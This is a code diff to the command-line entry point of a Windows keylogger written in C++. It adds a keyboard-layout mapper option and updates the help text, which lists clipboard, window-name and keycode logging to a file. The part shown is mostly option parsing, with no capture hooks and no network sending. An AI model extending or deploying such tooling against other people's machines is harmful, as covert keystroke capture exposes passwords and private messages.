@@ -9,6 +9,14 @@
 #include <iostream>
 #include <windows.h>
 
+Keylogger::IKeycodeMapper* getMapperByStr(std::string mapper) {
+    if (mapper == "us") {
+        return new Keylogger::KeycodeMapperUS();
+    } else {
+        return nullptr;
+    }
+}
+
 int main(int argc, char *argv[]) {
     const char* const short_opts = "chkm:o:s::w";
     const option long_opts[] = {
@@ -27,11 +35,16 @@ options:\n\
   -c, --clipboard        enable clipboard paste logging\n\
   -h, --help             shows this help menu\n\
   -k, --keycodes         log keycodes pressed/released\n\
-  -m, --mapper [name]    use this keycode mapper (default US)\n\
+  -m, --mapper [name]    use this keycode mapper (default 'us')\n\
   -o, --output [file]    output to this file\n\
   -s, --sandbox [seq]    capture key presses without passing them through\n\
   -w, --window           enable window name logging\n\
+\n\
+available keycode maps:\n\
+  us    US keyboard\n\
 ";
+
+    Keylogger::IKeycodeMapper* mapper = new Keylogger::KeycodeMapperUS();
 
     bool clipboardEnable = false;
     bool keycodesLog = false;
@@ -46,6 +59,14 @@ options:\n\
         case 'k':
             keycodesLog = true;
             break;
+        case 'm':
+            delete mapper;
+            mapper = getMapperByStr(optarg);
+            if (mapper == nullptr) {
+                std::cout << help;
+                return 1;
+            }
+            break;
         case 'w':
             windowEnable = true;
             break;
@@ -57,7 +78,6 @@ options:\n\
         }
     }
 
-    Keylogger::KeycodeMapperUS mapper;
     Keylogger::ClipboardHandlerWindows clipboard;
     Keylogger::WindowHandlerWindows window;
 
@@ -77,7 +97,7 @@ options:\n\
     }
 
     logger.open(
-        &mapper,
+        mapper,
         clipboardEnable ? &clipboard : nullptr,
         windowEnable ? &window : nullptr,
         "test.txt"
